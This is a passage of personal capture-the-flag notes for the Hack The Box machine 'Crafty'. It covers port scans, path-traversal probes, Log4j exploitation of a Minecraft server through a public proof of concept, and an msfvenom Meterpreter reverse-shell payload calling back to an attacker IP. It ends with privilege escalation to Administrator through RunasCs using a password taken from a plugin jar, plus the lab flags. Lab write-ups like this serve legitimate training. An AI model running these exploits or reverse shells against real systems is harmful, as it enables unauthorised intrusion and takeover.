@@ -1,0 +1,168 @@
+nmap -sC -sV -Pn -p- 10.10.11.249 -T4
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 15:12 EST
+Nmap scan report for 10.10.11.249
+Host is up (0.076s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Did not follow redirect to http://crafty.htb
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 151.47 seconds
+
+there is a webpage and hint to another webpage play.crafty.htb
+
+maybe need to look for subdomains
+
+dirsearch:
+    [15:17:56] 301 -  144B  - /js  ->  http://crafty.htb/js/
+[15:17:56] 403 -  312B  - /%2e%2e//google.com
+[15:17:57] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+[15:18:10] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
+[15:18:29] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+[15:18:37] 301 -  145B  - /css  ->  http://crafty.htb/css/
+[15:18:48] 301 -  145B  - /img  ->  http://crafty.htb/img/
+[15:18:48] 301 -  145B  - /index.html  ->  http://crafty.htb/home
+[15:18:51] 403 -    1KB - /js/
+
+did gobuster but didnt find much
+
+so i did nmap again:
+    nmap -sC -sV -Pn 10.10.11.249 -T4 -vvv -p0-65535                                                            130 ⨯
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 15:36 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 15:36
+Completed NSE at 15:36, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 15:36
+Completed NSE at 15:36, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 15:36
+Completed NSE at 15:36, 0.00s elapsed
+Initiating Connect Scan at 15:36
+Scanning crafty.htb (10.10.11.249) [65536 ports]
+Discovered open port 80/tcp on 10.10.11.249
+Discovered open port 25565/tcp on 10.10.11.249
+Connect Scan Timing: About 10.61% done; ETC: 15:41 (0:04:21 remaining)
+Connect Scan Timing: About 20.11% done; ETC: 15:41 (0:04:02 remaining)
+Connect Scan Timing: About 42.68% done; ETC: 15:39 (0:02:02 remaining)
+Connect Scan Timing: About 71.21% done; ETC: 15:39 (0:00:49 remaining)
+Completed Connect Scan at 15:38, 143.06s elapsed (65536 total ports)
+Initiating Service scan at 15:38
+Scanning 2 services on crafty.htb (10.10.11.249)
+Completed Service scan at 15:38, 6.22s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.11.249.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 15:38
+Completed NSE at 15:38, 5.12s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 15:38
+Completed NSE at 15:38, 0.46s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 15:38
+Completed NSE at 15:38, 0.00s elapsed
+Nmap scan report for crafty.htb (10.10.11.249)
+Host is up, received user-set (0.077s latency).
+Scanned at 2024-02-22 15:36:22 EST for 155s
+Not shown: 65534 filtered tcp ports (no-response)
+PORT      STATE SERVICE   REASON  VERSION
+80/tcp    open  http      syn-ack Microsoft IIS httpd 10.0
+|_http-title: Crafty - Official Website
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+25565/tcp open  minecraft syn-ack Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+found out that there is a vulnerability for this Minecraft server
+
+https://github.com/kozmer/log4j-shell-poc
+
+did searchsploit log4j
+
+to use this exploit we need java development kit 
+    https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
+
+in the the poc script we need to change the string:
+    String cmd="/bin/sh";
+to 
+    String cmd="cmd.exe";
+
+because its a windows OS
+
+after that we need a tool called pyCraft,to avoid install full Minecraft client,using git clone
+
+    https://github.com/ammaraskar/pyCraft
+
+after downloaded a tool, we need to build enviroment using:
+
+    python3 -m venv env
+
+it will ask us to download a python library:
+    sudo apt install python3.11-venv
+
+afert that we need to activate the enviroment using:
+
+      source env/bin/activate 
+
+and download the requirements using :
+    pip install -r requirements.txt
+
+to run the exploit properly, we need to move the pyCraft folder to the log4j folder, jdk folder as well
+
+its very important to launch the start.py in (env)
+
+we get the reverse shell and the user flag in c:\Users\svc_minecraft\Desktop>:
+    0730dbf750cc6241369f42e480e3f989
+
+to get a stable reverse shell,we need to use msfvenom:
+   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.125 LPORT=4445 -f exe -o revs.exe
+
+and upload it to the machine and run it 
+
+privileges:
+    whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+we will try to use runascs 
+
+certutil -urlcache -f 
+
+inside the c:\Users\svc_minecraft\server\ there is a folder name plugins
+
+inside it we have a playercounter-1.0-SNAPSHOT.jar
+
+open it using jd-gui
+
+inside the Playercounter.class we have some credentials:
+
+    's67u84zKq8IXw'
+
+now using runascs we will try to run the another reverse shell as Administrator
+
+crafting another payload on another port and uploading it to the machine
+
+launching msfconsole on to this payload
+
+now we need to lauch the reverse shell payload with runascs in admin credentials:
+
+    runascs.exe "Administrator" "s67u84zKq8IXw" "c:\Users\svc_minecraft\Desktop\revs4446.exe"
+
+and we get the shell with admin privileges
+
+cd c:\Users\Administrator\Desktop> and the root flag:
+    65875e8f04101a0b2f9fb72d3edc47a1
+
+
